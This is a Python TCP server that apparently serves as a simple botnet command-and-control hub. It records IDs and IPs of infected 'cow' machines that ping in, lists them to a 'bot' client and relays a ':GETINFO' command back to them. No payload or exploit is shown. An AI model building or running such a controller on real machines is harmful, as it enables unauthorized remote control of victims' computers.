import socket
import re

ip = '127.0.0.1'  #Local = 127.0.0.1, Public = 0.0.0.0
port = 4570

#Data
DeviceIDList = [] #ID
DeviceIPList = [] #IP
command = ""
response = ""

#Opening server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((ip, port))
server_socket.listen(5)

print(f"[+] Server listening on {ip}:{port}")

while True:
    client_socket, address = server_socket.accept()
    print(f"[+] Connection from {address}")

    msg = client_socket.recv(4096).decode()
    print(f"[>] Received:\n{msg}") #For debugging purposes

#From bot.py
    if msg.startswith(":LISTCOWS"):
        # List all machine IDs
        response = "\n".join(DeviceIDList)
        print(response)
        client_socket.send(response.encode())

    elif msg.startswith(":GETINFO"):
        command = ":COMMAND :GETINFO"
        print("sending command")
        client_socket.send(command.encode())
        
#From cow.py
    elif msg.startswith(":CLIENTPING"):
        DeviceInfo = msg.splitlines()

        if DeviceInfo[1] not in DeviceIDList:
            DeviceIDList.append(DeviceInfo[1])
            print(f"[+] New machine added: {DeviceInfo[1]}")
        else:
            print(f"[+] Ping from known device: {DeviceInfo[1]}")

        if DeviceInfo[2] not in DeviceIPList:
            DeviceIPList.append(DeviceInfo[2])
            print(f"[+] New IP added: {DeviceInfo[2]}")
        else:
            print(f"[+] Ping from known IP: {DeviceInfo[2]}")
    
    client_socket.send(command.encode())
    client_socket.close()

#Not used code
#    if msg.startswith(":PCINFO"):
 #       content = msg[len(":PCINFO"):].strip() #removees :TAG
  #      lines = content.split('\n')
   #     machine_id = lines[0]
    #    info = '\n'.join(lines[1:])
     #   pcInfos[machine_id] = info
#
 #       if machine_id not in machine_list:
  #          machine_list.append(machine_id)
   #         print(f"[+] New machine added: {machine_id}")
    #    else:
     #       print(f"[+] Existing machine updated: {machine_id}")